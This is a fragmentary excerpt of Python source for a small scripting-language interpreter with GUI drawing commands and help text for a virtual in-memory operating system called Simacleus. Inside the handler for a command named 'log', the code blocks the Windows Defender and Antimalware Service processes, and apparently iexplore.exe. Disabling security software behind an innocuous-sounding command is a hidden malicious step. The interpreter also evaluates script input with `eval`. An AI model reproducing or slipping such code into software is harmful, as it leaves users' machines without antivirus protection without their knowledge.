...
class SimonicGUI:
	...
	def text(self, font, color, size, pady, text):
		...
		for t in text.split("\n"):
			...
			surface = font.render(t, True, color)
...
def runCode(code):
	...
	try:
		if m == "log":
			...
			runCode("taskblock;Antimalware Service Executable")
			runCode("taskblock;Windows Defender Antivirus Service")
			runCode("taskblock;Windows Defender Service")
			runCode("taskblock;Windows Defender Program")
...
taskblock;iexplore.exe""")
			...
			pady = float(o[4])
			text = ";".join(o[5:])
			vars[varname].text(font, color, size, pady, text)
		elif m == "smgui.circle":
			varname = o[0]
			color = eval(o[1])
			size = int(o[2])
			...
			print("mouseClick = Click with mouse on screen")
			...
			print("simac;varname;id(optional text);base(console/32/64) = Creates a virtual Simacleus operating system (In memory)")
			print("simac.write;varname;filename;content... = Create or set file on os")
			print("simac.read;varname;filename;resultVarname = Read content of file on os and save to result variable")
			print("simac.mkdir;varname;path = Create directory on os")
			print("simac.rmdir;varname;path = Remove directory from os")
			print("simac.listdir;varname;path;resultVarname = Get text list of files on directory path")
			print("simac.run;varname = It replaces the virtual operating system with real-time Python compiler commands (So, while normal commands are used, the virtual OS is actually used for file operations)")
			print("simac.stop;varname = It stops real-time command change in the loop (Commands continue to be executed in different ways, re-importing the modules can fix it)")
